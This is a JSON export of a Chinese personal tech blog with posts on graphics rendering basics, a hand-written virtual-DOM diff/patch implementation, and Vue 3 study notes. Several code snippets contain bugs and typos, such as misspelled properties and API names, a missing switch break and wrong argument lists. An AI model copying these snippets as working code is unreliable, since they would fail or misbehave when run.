{"meta":{"title":"Ccw's Blogs","subtitle":"","description":"","author":"ccw","url":"http://example.com","root":"/"},"pages":[{"title":"关于","date":"2024-09-21T23:41:06.486Z","updated":"2024-09-21T23:41:06.486Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""}],"posts":[{"title":"渲染原理","slug":"渲染原理","date":"2024-08-21T00:27:00.000Z","updated":"2024-09-21T23:13:11.175Z","comments":true,"path":"2024/08/21/渲染原理/","permalink":"http://example.com/2024/08/21/%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/","excerpt":"","text":"着色器着色器类似于一个计算器，用于根据给定的参数，制作特效； 法线贴图这个中文名称有点怪，英文名称是 Normal Map，即普通贴图；它主要用于展现凹凸效果；理论上凹凸效果也可以使用建模来实现，但是当细节很多时，工作量过大，因此不现实。更高效的做法是使用带凹凸参数的贴图；物体只由数量有限的多边形来表示，表现的纹理则基于贴图参数来计算； 所谓的贴图参数，即是一种细节模拟，这些参数可用来计算光线效果，让相应的部位看起来像是有真实的模型存在一样。但实际上没有，完成是基于参数计算出来的效果； 法线：垂直于某个平面的线，这条线可用来计算物体和光线之间的夹角。 有了夹角后，就可以计算物体表面接收到多少光线； 物体呈现出体积形状，其实是由物体表面所反向的光线决定的。对于一个多边形圆柱体，如果我们将法线的角度变化，调整成圆柱形的，那么计算出来的着色也将是平滑过渡的，最后在我们肉眼看来，多边形变成了圆形。但实际上，底层的参数存储的是多边形； 将表面的法线角度与真实角度的偏差，单独抽离出来存储，那么这个偏差值的集合，就是所谓的法线贴图； CPU 渲染逻辑主要有四个工作： 剔除工作： 视锥体剔除； 图层剔除； 遮挡剔除； 设置渲染顺序： 不透明队列：根据距离摄像头的距离，由近到远依次渲染； 半透明队列：从远到近渲染； 打包数据：将数据打包发送给 GPU 渲染； 模型信息：顶点坐标、法线、UV、切线、顶点颜色、索引列表等； 变换矩阵：世界变换矩阵、VP 矩阵（基于相机位置和 FOV 参数）； 灯光、材质参数：着色器和材质参数，灯光信息等； 调用渲染函数 SetPassCall shader 脚本中的一个 Pass 语义块就是一个完整的渲染过程；一个着色器可包含多个 Pass 语义块； DrawCall：CPU 调用图像编程接口，命令 GPU 渲染的操作，即渲染命令；渲染命令的参数为图元列表，其计算结果为显示在屏幕上的像素； CPU 渲染阶段的一个重要输出是渲染图元，图元中包括 GPU 渲染需要用到的各种参数信息，例如点、线、面等几何信息； GPU 渲染管线GPU 渲染管线包含以下多个步骤： 顶点处理 顶点着色器：主要执行坐标转换，将顶点的坐标转换到齐次裁剪 曲面细分着色器（可选） 几何着色器（可选） 图元装配 光栅化 片元着色器 输出合并","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"渲染","slug":"渲染","permalink":"http://example.com/tags/%E6%B8%B2%E6%9F%93/"}]},{"title":"VirtualDOM 简易实现","slug":"VirtualDom 简易实现","date":"2024-06-22T04:12:00.000Z","updated":"2024-09-21T23:18:59.804Z","comments":true,"path":"2024/06/22/VirtualDom 简易实现/","permalink":"http://example.com/2024/06/22/VirtualDom%20%E7%AE%80%E6%98%93%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"Vuejs 和 Reactjs 都用到了虚拟DOM，来实现数据绑定和 DOM 的自动更新，此处做了一个简单的实现，方便学习基本的工作原理； 12345678910111213const exampleButton = &#123; tag: &quot;button&quot;, properties: &#123; class: &quot;primary&quot;, disabled: true, onClick: doSomething, &#125;, children: [] // 虚拟节点列表&#125;const exampleText = &#123; text: &quot;Hello&quot;&#125; 1234567function h(tag, properties, children) &#123; return &#123; tag, properties, children &#125;;&#125;function text(content) &#123; return &#123; text: content &#125;&#125; 1234567891011121314151617181920212223242526272829function diffOne(l, r) &#123; const isText = l.text !== undefined; // 若是文本，直接替换 if (isText) &#123; return l.text !== r.text ? &#123; replace: r &#125; : &#123; noop: true &#125; &#125; // 若 tag 不同，直接替代 if (l.tag !== r.tag) &#123; return &#123; replace: r &#125;; &#125; // 检查需要删除的属性 const remove = []; for (const prop in l.properties) &#123; if (r.properties[prop] === undefined) &#123; remove.push(prop); &#125; &#125; // 检查新增的属性 const set = &#123;&#125;; for (const prop in r.properties) &#123; if (r.properties[prop] !== l.properties[prop]) &#123; set[prop] = r.properties[prop]; &#125; &#125; const children = diffList(l.chilren, r.children); return &#123; modify: &#123; remove, set, children &#125; &#125;;&#125; 1234567891011121314function diffList(ls, rs) &#123; const length = Math.max(ls.length, rs.length); return Array.from(&#123; length &#125;).map((_, i) =&gt; &#123; if (ls[i] === undefined) &#123; return &#123; create: rs[i] &#125; &#125; else &#123; if (rs[i] === undefined) &#123; return &#123; remove: true &#125; &#125; else &#123; return diffOne(ls[i], rs[i]) &#125; &#125; &#125;)&#125; 12345678910111213141516171819202122232425262728function apply(el, enqueue, childrenDiff) &#123; const children = Array.from(el.childNodes); childrenDiff.forEach((diff, i) =&gt; &#123; const action = Object.keys(diff)[0]; switch(action) &#123; case &quot;remove&quot;: &#123; children[i].remove(); break; &#125; case &quot;modify&quot;: &#123; modify(children[i], enqueue, diff.modify); &#125; case &quot;create&quot;: &#123; const child = create(enqueue, diff.create); el.appendChild(child); break; &#125; case &quot;replace&quot;: &#123; const child = create(diff.replace); children[i].replacewith(child); break; &#125; case &quot;noop&quot;: &#123; break; &#125; &#125; &#125;)&#125; 12345678910111213141516171819202122232425262728element[&quot;_ui&quot;] = &#123; listeners: &#123; click: doSomething &#125;&#125;// 事件监听函数, 所有事件都归集到同一个函数进行处理function listener(event) &#123; const el = event.currentTarget; const handler = el._ui.listeners[event.type]; const enqueue = el._ui.enqueue; const msg = handler(event); if (msg !== undefined) &#123; enqueue(msg) &#125;&#125;// 给 el 添加事件监听函数function setListener(el, event, handle) &#123; if (el._ui.listeners[event] === undefined) &#123; el.addEventListener(event, listener); &#125; el._ui.listeners[event] = handle;&#125;// 获得监听的事件名称function eventName(str) &#123; if (str.indexOf(&quot;on&quot;) === 0) &#123; return str.slice(2).toLowerCase(); &#125; return null;&#125; 12345678910111213141516const props = new Set([ &quot;autoplay&quot;, &quot;checked&quot;, &quot;checked&quot;, &quot;contentEditable&quot;, &quot;controls&quot;, &quot;default&quot;, &quot;hidden&quot;, &quot;loop&quot;, &quot;selected&quot;, &quot;spellcheck&quot;, &quot;value&quot;, &quot;id&quot;, &quot;title&quot;, &quot;accessKey&quot;, &quot;dir&quot;, &quot;dropzone&quot;, &quot;lang&quot;, &quot;src&quot;, &quot;alt&quot;, &quot;preload&quot;, &quot;poster&quot;, &quot;kind&quot;, &quot;label&quot;, &quot;srclang&quot;, &quot;sandbox&quot;, &quot;srcdoc&quot;, &quot;type&quot;, &quot;value&quot;, &quot;accept&quot;, &quot;placeholder&quot;, &quot;acceptCharset&quot;, &quot;action&quot;, &quot;autocomplete&quot;, &quot;enctype&quot;, &quot;method&quot;, &quot;name&quot;, &quot;pattern&quot;, &quot;htmlFor&quot;, &quot;max&quot;, &quot;min&quot;, &quot;step&quot;, &quot;wrap&quot;, &quot;useMap&quot;, &quot;shape&quot;, &quot;coords&quot;, &quot;align&quot;, &quot;cite&quot;, &quot;href&quot;, &quot;target&quot;, &quot;download&quot;, &quot;download&quot;, &quot;hreflang&quot;, &quot;ping&quot;, &quot;start&quot;, &quot;headers&quot;, &quot;scope&quot;, &quot;span&quot; ]);function setProperty(prop, value, el) &#123; if (props.has(prop)) &#123; el[prop] = value; &#125; else &#123; el.setAttribute(prop, value); &#125;&#125; 1234567891011121314151617181920212223function create(enqueue, vnode) &#123; if (vnode.text !== undefined) &#123; const el = document.createTextNode(vnode.text); return el; &#125; const el = document.createElement(vnode.tag); el._ui = &#123; listeners: &#123;&#125;, enqueue &#125;; // 有些 properties 是真的 prop, 有些则是事件监听函数，所以需要区别对待 for (const prop in vnode.properties) &#123; const event = eventName(prop); const value = vnode.properties[prop]; if (event !== null) &#123; setListener(el, event, value); &#125; else &#123; setProperty(prop, value, el); &#125; &#125; for (const childNode of vnode.children) &#123; const child = create(enqueue, childNode); el.appendChild(child); &#125; return el;&#125; 123456789101112131415161718192021function modify(el, enqueue, diff) &#123; for (const prop of diff.remove) &#123; const event = eventName(prop); if (event === null) &#123; el.removeAttribute(prop); &#125; else &#123; el._ui.listeners[event] = undefined; el.removeEventListener(event, listener); &#125; &#125; for (const prop in diff.set) &#123; const value = diff.set[prop]; const event = eventName[prop]; if (event !== null) &#123; setListener(el, event, value); &#125; else &#123; setProperty(prop, value, el); &#125; &#125;; apply(el, enqueue, diff.children);&#125; 1234567891011121314151617// 应用示例function view(state) &#123; return [ h(&quot;p&quot;, &#123;&#125;, [ text(`counter: $&#123;state.counter&#125;`)]) ];&#125;function update(state, msg) &#123; return &#123; counter: state.counter + msg &#125;&#125;const initialState = &#123; counter: 0 &#125;;const root = document.querySelector(&quot;.my-application&quot;);const &#123; enqueue &#125; = init(root, initialState, update, view);setInterval(() =&gt; enqueue(1), 1000); 123456789101112131415161718192021222324252627282930function init(root, initialState, update, view) &#123; let state = initialState; let nodes = []; let queue = []; function enqueue(msg) &#123; queue.push(msg); &#125; function draw() &#123; let newNodes = view(state); apply(root, enqueue, diffList(nodes, newNodes)); nodes = newNodes; &#125; function updateState() &#123; if (queue.length &gt; 0) &#123; let msgs = queue; queue = []; for (msg of msgs) &#123; state = update(state, msg, enqueue); &#125; draw(); &#125; window.requestAnimationFrame(updateState); &#125; draw(); updateState(); return &#123; enqueue &#125;;&#125; 12345const button = h( &quot;button&quot;, &#123; onClick: () =&gt; 1 &#125;, [ text(&quot;increase counter&quot;)],)","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Vue3","slug":"Vue3","date":"2023-08-19T02:33:00.000Z","updated":"2024-09-21T23:19:17.115Z","comments":true,"path":"2023/08/19/Vue3/","permalink":"http://example.com/2023/08/19/Vue3/","excerpt":"","text":"基础app.use() 注册插件，有点像 Express 中的 use；所谓的插件，即具备某些功能的一段代码，这段代码用于添加全局功能； 插件可以是一个对象，也可以是一个函数； 如果是一个对象，需要有一个 install 方法，以便调用；该 install 函数的第一个参数是 app，第二个参数是 options 123456789import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123;&#125;)app.use(myPlugin, &#123; greetings: &#123; hello: &quot;Bonjour!&quot; &#125;&#125;); 12345678910111213// plugins/i18n.jsexport default &#123; install: (app, options) =&gt; &#123; // 注入一个全局可用的 $translate() 方法 app.config.globalProperties.$translate = (key) =&gt; &#123; // 获取 `options` 对象的深层属性 // 使用 `key` 作为索引 return key.split(&#x27;.&#x27;).reduce((o, i) =&gt; &#123; if (o) return o[i] &#125;, options) &#125; &#125;&#125; 1&lt;h1&gt;&#123;&#123; $translate(&#x27;greetings.hello&#x27;) &#125;&#125;&lt;/h1&gt; 插件的几种使用场景： 添加一些全局属性和方法； 添加一个全局资源； 添加一个全局组件 添加自定义指令； app.config.isCustomElement 有些元素是从外部引入的，并没有在 vue 中编写，此时需要备注一下哪些元素是自定义的，以免在编译时报错找不到； 1app.config.isCustomElement = tag =&gt; /^x-/.test(tag); app.mount 将 app 关联到 HTML 文件中的 Tag 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;TodoMVC built with Vue Composition Api and Vuex&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;app-root&gt;&lt;/app-root&gt; &lt;script type=&quot;module&quot; src=&quot;./main.js&quot;&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; reactivereactive 可用来创建一个对象，这个对象可以被多个组件引入，共享使用； 对象可以有自己的方法，通过调用该方法，改变对象的状态；这个改变会在所有的组件上同时更新； 12345678import &#123; reactive &#125; from &quot;vue&quot;;export const store = reactive(&#123; count: 0, increment() &#123; this.count++ &#125;&#125;); 12345&lt;template&gt; &lt;button @click=&quot;store.increment()&quot;&gt; &#123;&#123; store.count &#125;&#125; &lt;/button&gt;&lt;/template&gt; 除了用 reactive 来创建全局对象外，其实 ref 或者函数也可以实现该功能； 函数之所以可以，主要是利用了闭包的特性； 123456789101112131415import &#123; ref &#125; from &quot;vue&quot; // 保存状态的全局对象const globalCount = ref(1);export function useCount() &#123; // 保存状态的局部变量 const localCount = ref(1); return &#123; globalCount, localCount, &#125;&#125; 问：reactive 和 ref 有什么区别？ 答：有以下一些区别： reactive 只能处理对象，不能处理原始类型；ref 的底层实现其实最终也有调用 reactive； ref 可以通过 .value 重新赋值，reactive 不行，因此 reactive 在处理新的 array 时，不如 ref 重新赋值方便； 不过 reactive 修改对象的属性时，无须使用 .value，写起来会简单一些； 12345678910111213141516171819// reactive 很适合管理一个拥有多个原始类型属性的对象；const person = reactive(&#123; name: &quot;John&quot;, age: 37, isTall: true,&#125;); // 以上写法比使用多个 ref 来得方便const name = ref(&quot;Albert&quot;);const age = ref(37);const isTall = ref(true);// 但 ref 其实也可以写成下面这样const person = ref(&#123; name: &quot;John&quot;, age: 37, isTall: true,&#125;); computed() 其实也是返回一个 ref computed当值 B 依赖于值 A 时，通过 computed 可以实现当 A 变动时，B 实现实时更新； computed 接收一个函数做为参数，返回的是一个 ref 12345678910111213141516171819202122&lt;script setup&gt;import &#123; reacitve, computed &#125; from &quot;vue&quot; const author = reactive(&#123; name: &quot;john&quot;, books: [ &quot;vue1&quot;, &quot;vue2&quot;, &quot;vue3&quot;, ]&#125;);// computed 接收一个函数做为参数，返回的是一个 refconst message = computed(() =&gt; &#123; return author.books.length &gt; 0 ? &quot;yes&quot; : &quot;no&quot;;&#125;);&lt;/script&gt;&lt;template&gt; &lt;p&gt;Has Published books:&lt;/p&gt; &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;&lt;/template&gt; computed 的好处是有缓存，也就是说，如果所依赖的值没变的话，它是不会重新计算的； 实际上 message 也可以定义成一个函数，结果一样，示例如下： 123456789101112131415161718&lt;script setup&gt;const author = reactive(&#123; name: &quot;john&quot;, books: [ &quot;vue1&quot;, &quot;vue2&quot;, &quot;vue3&quot;, ]&#125;);function message() &#123; return author.books.length &gt; 0 ? &quot;yes&quot; : &quot;no&quot;;&#125;&lt;/script&gt;&lt;template&gt; &lt;p&gt;Has Published books:&lt;/p&gt; &lt;span&gt;&#123;&#123; message() &#125;&#125;&lt;/span&gt;&lt;/template&gt; 状态管理器vue2 的状态管理器，在 vue3 中使用 Pinia 类与样式绑定有多种写法可用来绑定样式 123456// 方式一: 使用单个 ref&lt;script setup&gt;const isAcitve = ref(true);&lt;/script&gt;&lt;div :class=&quot;&#123; acitve: isActive &#125;&quot;&gt;&lt;/div&gt; 123456789101112// 方式二：使用多个 ref&lt;script setup&gt;const isAcitve = ref(true);const hasError = ref(false);&lt;/script&gt;&lt;template&gt; &lt;div class=&quot;static&quot; :class=&quot;&#123; active: isActive, &#x27;text-danger&#x27;: hasError &#125;&quot;&gt; &lt;/div&gt;&lt;/template&gt; 123456789// 方式三：使用对象&lt;script setup&gt;const classObject = &#123; active: true, &#x27;text-danger&#x27;: false,&#125;&lt;/script&gt;&lt;div :class=&quot;classObject&quot;&gt;&lt;/div&gt; 123456789101112// 方法四：使用数组&lt;script setup&gt;const activeClass = ref(&#x27;active&#x27;);const errorClass = ref(&#x27;text-danger&#x27;); const isActive = ref(true);&lt;/script&gt;&lt;div :class=&quot;[isActive ? activeClass : &#x27;&#x27;, errorClass]&quot;&gt;&lt;/div&gt;// 或者&lt;div :class=&quot;[&#123;[activeClass]: isActive &#125;, errorClass]&quot;&gt;&lt;/div&gt; 自定义组件上的 class 值，会传递到组件内部的 Tag 上面，示例如下： 12// 组件 myComponent 内部的内容&lt;p class=&quot;foo bar&quot;&gt;&lt;/p&gt; 12// 在调用 myComponent 组件时&lt;myComponent class=&quot;baz boo&quot;&gt;&lt;/myComponent&gt; 12// 渲染结果为&lt;p class=&quot;foo bar baz boo&quot;&gt;&lt;/p&gt; 如果 myComponent 内部有多上根Tag，那么需要指定哪个根 Tag 接收外部传进来的 class 值，示例如下 123// 内部有两个根元素 p 和 span，此处指定 p 接收 myComponent 的 class 值&lt;p :class=&quot;$attrs.class&quot;&gt;hi&lt;/p&gt;&lt;span&gt;message&lt;/span&gt; 适用于 class 的绑定规则，同样也适用于 style 的绑定，示例如下： 1234const styleObject = reactive(&#123; color: &#x27;red&#x27;, fontSize: &#x27;30px&#x27;&#125;) 1&lt;div :style=&quot;styleObject&quot;&gt;&lt;/div&gt; 事件修饰符当我们想阻止某个事件的冒泡时，可以在绑定的方法中调用 event.stopPropagation()，但 vue 还提供了一种更简便的方法，示例如下： 12345678// 旧方法function warn(message, event) &#123; // 这里可以访问原生事件 if (event) &#123; event.preventDefault() &#125; alert(message)&#125; 以下是使用事件修饰符进行绑定的方式： 12345678&lt;!--新方法--&gt;&lt;script setup&gt;function warn(message, event) &#123; alert(message)&#125; &lt;/script&gt;&lt;a @click.stop=&quot;warn&quot;&gt;&lt;/a&gt; 按键修饰符按键修饰符可用于监听键盘上某个特定的键被按下的事件 123456&lt;!--此处监听 enter 键--&gt;&lt;input @keyup.enter=&quot;submit&quot; /&gt;&lt;!--此处监听 pageDown 键--&gt;&lt;input @keyup.page-down=&quot;onPageDown&quot; /&gt; 鼠标修饰符用来监听鼠标事件 .left 左键 .right 右键 .middle 中键 表单输入绑定在处理表单输入时，是需要双向绑定的，即改动 data，会更新 html；而改动 input 时，也会更新 data vue 使用 v-model 关键字来实现这种双向绑定 1&lt;input v-model=&quot;text&quot;&gt; 多个复选框可以绑定到一个数组或集合 12345678910111213141516&lt;script setup&gt;const checkedNames = ref([]);&lt;/script&gt;&lt;template&gt; &lt;div&gt;checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/div&gt; &lt;input type=&quot;checkbot&quot; id=&quot;jack&quot; value=&quot;jack&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;jack&quot;&gt;&lt;/label&gt; &lt;input type=&quot;checkbot&quot; id=&quot;john&quot; value=&quot;john&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;john&quot;&gt;&lt;/label&gt; &lt;input type=&quot;checkbot&quot; id=&quot;mike&quot; value=&quot;mike&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;mike&quot;&gt;&lt;/label&gt;&lt;/template&gt; v-bindv-bind 可用于标签的属性绑定 1234567891011&lt;div v-bind=&quot;&#123; id: &#x27;blue&#x27;&#125;&quot;&gt;&lt;/div&gt;&lt;!--等同于如下--&gt;&lt;div id=&quot;blue&quot;&gt;&lt;/div&gt;&lt;!--简写如下--&gt;&lt;script setup&gt; const id = ref(&quot;abc&quot;);&lt;/script&gt;&lt;div :id=&quot;id&quot;&gt;&lt;/div&gt; v-model 修饰符.lazy默认情况下，v-model 的更新是实时的，但可使用 .lazy 修饰符，让更新不再实时，而是触发 change 事件后再更新 1&lt;input v-model.lazy=&quot;msg&quot; /&gt; .number将输入的字符串自动转成数字 1&lt;input v-model.number=&quot;age&quot; /&gt; .trim自动去除字符串首尾的空格 1&lt;input v-mdoel.trim=&quot;msg&quot; /&gt; 生命周期最常用的几个生命周期 onMounted onUpdated onUnmounted watch 侦听器当某个对象的值出现变化时，就执行回调函数；监听的对象可以是如下几种类型 12345678910111213141516171819202122232425const x = ref(0);const y = ref(0);// 监听单个 ref 对象watch(x, (new_x) =&gt; &#123; // do something&#125;);// 监听 getter 函数watch( () =&gt; x.value + y.value, (sum) =&gt; &#123; console.log(&quot;sum of x and y is: &quot;, sum); &#125;);// 监听数组watch( [x, () =&gt; y.value], ([new_x, new_y]) =&gt; &#123; console.log(`new x is $&#123;new_x&#125; and new y is $&#123;new_y&#125;`); &#125;); watch 并非马上执行，而是当监听对象的值出现变化时，才会执行。因此，如果想让它立即执行，那么需要加个 { immediate: true } 参数； 默认情况下，如果在回调函数中访问监听对象，此时监听对象的值，是原始状态；如果未被回调函数改变前的状态；如果需要访问改变后的状态，则需要给 watch 传递 { flush: “post” } 选项； watchEffectwatchEffect 有点像是 watch 的语法糖，在使用 watch 时，需要显示的指定某个监听对象；watchEffect 则不用，它可以自动从回调函数中判断需要监听的对象；而且是加载后，马上执行 1234567const todoId = ref(1);const data = ref(null);watchEffect(async () =&gt; &#123; const res = await fetch(`https://example.com/$&#123;todoId.value&#125;`) data.value = await res.json();&#125;) 访问 DOM如果想直接访问 DOM，则可以给标签的 ref 属性设置名称，之后就可以在代码中引用它，示例如下： 12345678910111213&lt;script setup&gt;import &#123; ref, onMounted &#125; from &quot;vue&quot;;const myInput = ref(null); // 此处用同名变量，实现对 input 标签的引用onMounted(() =&gt; &#123; myInput.value.focus();&#125;)&lt;/script&gt;&lt;template&gt; &lt;input ref=&quot;myInput&quot;&gt;&lt;/template&gt; 当 ref 被用在子组件上时，此时引用的不再是标签，而是子组件实例 12345678910&lt;script setup&gt; import &#123; ref, onMounted &#125; from &quot;vue&quot;; import Child from &quot;./Child.vue&quot;; const child = ref(null); // 此处引用的是 Child 实例&lt;/script&gt;&lt;template&gt; &lt;Child ref=&quot;child&quot;&gt;&lt;/Child&gt;&lt;/template&gt; 默认情况下，子组件内部的属性和方法是私有的，父组件无法直接访问，除非子组件使用 defineExpose 进行暴露； 1234567891011&lt;script setup&gt; import &#123; ref &#125; from &quot;vue&quot;; const a = 1; const b = ref(2); defineExpose(&#123; a, b, &#125;)&lt;/script&gt; 此时父组件可通过 ref 引用来访问子组件中的 a 和 b 变量 1// 此时 ref 的值为 &#123; a: number, b: number &#125; 组件API以下两种形式的 API 是等价的 123456789&lt;!-- 组合式 API --&gt;&lt;script setup&gt; import &#123; ref &#125; from &#x27;vue&#x27;; const count = ref(0);&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;count++&quot;&gt;&lt;/button&gt;&lt;/template&gt; 123456789101112&lt;!-- 选项式 API --&gt;import &#123; ref &#125; from &#x27;vue&#x27;;export default &#123; setup: () =&gt; &#123; const count = ref(0); return &#123; count &#125;; &#125;, template: `&lt;button @click=&quot;count++&quot;&gt;&lt;/button&gt;` // template 也可以引用一个模板 // template: &#x27;#my-template-element&#x27;&#125; 父组件可通过 props 向子组件传递数据；子组件可 emit 事件，父组件通过监听事件来获得子组件传递的数据； slot 插槽slot 的作用类似于占位符，可接收由父组件传进来的 HTML 内容，示例如下： 1234567&lt;!--AlertBox.vue--&gt;&lt;template&gt; &lt;div&gt; &lt;strong&gt;This is an Error box&lt;/strong&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt; 12&lt;!--此处父组合的内容 Something bad happen 会出现中子组件的 slot 位置--&gt;&lt;AlertBox&gt;Something bad happen&lt;/AlertBox&gt; 深入组件注册全局注册组件需要注册后才能使用，通过 app.component 方法，可将某个组件注册为全局的组件，之后可以在任意文件中使用该全局组件； 123456import &#123; createApp &#125; from &#x27;vue&#x27;;import MyComponent from &quot;./App.vue&quot;;const app = createApp(&#123;&#125;);app.component(&#x27;MyComponent&#x27;, MyComponent); // 全局注册 局部注册局部注册：仅在需要使用的位置，导入相应的组件 1234567&lt;script setup&gt; import ComponentA from &#x27;./ComponentA.vue&#x27;&lt;/script&gt;&lt;template&gt; &lt;ComponentA /&gt;&lt;/template&gt; props除了 attribute 外，考虑父组件还可通过 props 传递数据给子组件。因此，最好显式的声明 props，这样有利于 Vue 区分二者； 12345678910111213141516171819202122232425// props 使用对象，并写上属性值的类型，有助于尽早发现传错参数defineProps(&#123; title: String, likes: Number&#125;)// 还可以添加校验规则defineProps(&#123; propA: &#123; type: String, required: true, default: &quot;hello&quot; &#125;, propB: &#123; validator(value, props) &#123; return [&#x27;success&#x27;, &#x27;warning&#x27;, &#x27;danger&#x27;].includes(value); &#125; &#125;, propC: &#123; type: Function, // 可以是函数类型 default() &#123; return &#x27;Default Function&#x27; &#125; &#125;&#125;) Vue 倾向在写 HTML atribute 时，使用传统的 kecal-case 枨，然后它还会自动映射 kebab-case 和 camelCase 格式，以便和传统的 javascript camelCase 保持一致； 个人感觉这种两边讨好的做法不是很好；缺少一致性，容易让人感到困惑； 1&lt;MyComponent greeting-message=&quot;hello&quot;&gt;&lt;/MyComponent&gt; 当使用 v-bind 时，引号中的内容，实际上是一个表达式，而不是字符串 123456789101112131415&lt;!-- 因为使用 v-bind，所以此处的 42 其实是一个 Number 类型， --&gt;&lt;!-- 因为这是一个 JavaScript 表达式而不是一个字符串 --&gt;&lt;BlogPost :likes=&quot;42&quot; /&gt;&lt;!-- 根据一个变量的值动态传入 --&gt;&lt;BlogPost :likes=&quot;post.likes&quot; /&gt;&lt;!-- 同理，false 是一个布尔值 --&gt;&lt;BlogPost :is-published=&quot;false&quot; /&gt;&lt;!-- 表达式自然是支持数组的 --&gt;&lt;BlogPost :commend-ids=&quot;[234, 245, 273]&quot; /&gt;&lt;!--表达式也支持对象--&gt;&lt;BlogPost :author=&quot;&#123; name: &#x27;John&#x27;, age: 47 &#125;&quot; /&gt; 可通过 v-bind&#x3D;对象，批量绑定多个 prop 123456789&lt;script setup&gt;const post = &#123; id: 1, title: &quot;My Journey&quot;&#125;&lt;/script&gt;&lt;!--同时绑定了 id 和 title 两个 prop --&gt;&lt;BlogPost v-bind=&quot;post&quot; /&gt; 注意：prop 是单向绑定，即数据由父组件传递给子组件，这意味着它是只读的，我们不能在子组件的代码中，修改 prop 的值 1234const props = defineProps([&#x27;foo&#x27;]);// 以下尝试修改 foo 的值是错误的props.foo = &quot;bar&quot;; 由于在 Javascript 中，对象类型的参数，实际上是一个引用，因此，虽然无法直接更改对象绑定的变量，但可以改变对象内部的属性。但这是一种不良做法，应该在实践中避免；如有需要修改，应使用 emit 事件的方式；由监听事件的父组件对 prop 进行修改； 事件在组件的 template 模板中，可使用内置的 $emit 函数来触发事件 1&lt;button @click=&quot;$emit(&#x27;someEvent&#x27;)&quot; /&gt; 事件支持携带参数 1&lt;button @click=&quot;$emit(&#x27;someEvent&#x27;, param)&quot; /&gt; 通过使用 defineEmit() 宏显式的声明可触发的事件后，会返回一个 emit 函数，能够在代码中直接调用，它的效果跟 template 中的 $emit 是一样的； 1234567&lt;script setup&gt; const emit = defineEmits([&#x27;inFocus&#x27;, &#x27;submit&#x27;]); function buttonClick() &#123; emit(&quot;submit&quot;); &#125;&lt;/script&gt; 组件 v-model通过在子组件上使用 v-model，可以实现父子组件之间数据的双向绑定；父子组件传统的通信方式是使用 prop 和 emit，事实上在组件上使用 v-model 只是一个语法糖，它的底层仍然还是 prop 和 emit，只是它由解释器完成补全； 123456&lt;!--父组件--&gt;&lt;script setup&gt; const myRef = ref();&lt;/script&gt;&lt;Child v-model=&quot;myRef&quot; /&gt; 12345678&lt;!--子组件 Child.vue --&gt;&lt;script setup&gt; const myRefVar = defineModel();&lt;/script&gt;&lt;template&gt; &lt;input v-model=&#x27;myRefVar&#x27; /&gt;&lt;/template&gt; 可以绑定多个 v-model 12345&lt;!-- 父组件 --&gt;&lt;UserName v-model:firstName=&quot;first&quot; v-model:lastName=&quot;last&quot; /&gt; 1234567891011&lt;!-- 子组件 --&gt;&lt;script setup&gt;const firstName = defineModel(&quot;firstName&quot;);const lastName = defineModel(&quot;lastName&quot;);&lt;/script&gt;&lt;template&gt; &lt;input type=&quot;text&quot; v-model=&quot;firstName&quot; /&gt; &lt;input type=&quot;text&quot; v-model=&quot;lastName&quot; /&gt;&lt;/template&gt; 组件 v-model 同样支持修饰符，例如 v-model.capitalize，之后在 defineModel 中，可以基于传入的修饰符的值，自定义 set 函数，实现想要的处理； 12&lt;!-- 父组件 --&gt;&lt;MyComponent v-model.capitalize=&#x27;myText&#x27; /&gt; 12345678910111213141516171819202122&lt;!-- 子组件 --&gt;&lt;script setup&gt; const [model, modifiers] = defineModel(); console.log(&quot;modifiers&quot;) // &#123; capitalize: true &#125;&lt;/script&gt;&lt;template&gt; &lt;input type=&#x27;text&#x27; v-model=&quot;model&quot; /&gt;&lt;/template&gt;&lt;!-- 或者可以针对 modifiers 自定义处理方法 --&gt;&lt;script setup&gt; const [model, modifiers] = defineModel(&#123; set(value) &#123; if (modifiers.capitalize) &#123; return value.charAt(0).toUppercase() + value.slice(1) &#125; return value; &#125; &#125;)&lt;/script&gt; 透传 Attributes最常见的透传包括 class, style, id 等几个 HTML 标签的属性；但其实 v-on 监听器也会实现透传 12&lt;!-- 父组件 --&gt;&lt;MyButton @click=&quot;onClick&quot;&gt;&lt;/MyButton&gt; 12&lt;!-- 子组件 --&gt;&lt;button @click=&quot;onChildClick&quot; /&gt; 当 button 触发点击事件时，onChildClick 和 onClick 两个函数都会被执行，事实上 button 标签绑定了来自父子组件的两个点击事件； 深层组件继承如果子组件的根元素也是一个组件，那么父组件的 attributes 会持续向下一级透传； 如果不想要继承透传，可在组件选项中设置 inheritAttrs: false 12345&lt;script setup&gt; defineOptions(&#123; inheritAttrs: false, &#125;)&lt;/script&gt; 透传的 attributes 可在 template 中使用 $attris 进行访问 1&lt;span&gt;&#123;&#123; $attrs &#125;&#125;&lt;/span&gt; @click 在透传后，子组件可使用 $attrus.onClick 进行访问； 如果子组件有多个根节点，那么需要显式指定由哪个根节点继承父组件透传的 attris，否则编译器会抛出警告； 如果想要在 js 代码中访问 attrus，则可以使用 useAttrs 12345&lt;script setup&gt; import &#123; useAttrs &#125; from &#x27;vue&#x27;; const attrs = useAttrs();&lt;/script&gt; 插槽父组件可通过插横向子组件传递内容；插槽从某种意义上来说，有点像是一个形式参数。子组件本身只提供样式，内容则由参数来决定，这样可以提高子组件的通用性和灵活性； 12345&lt;!-- 父组件 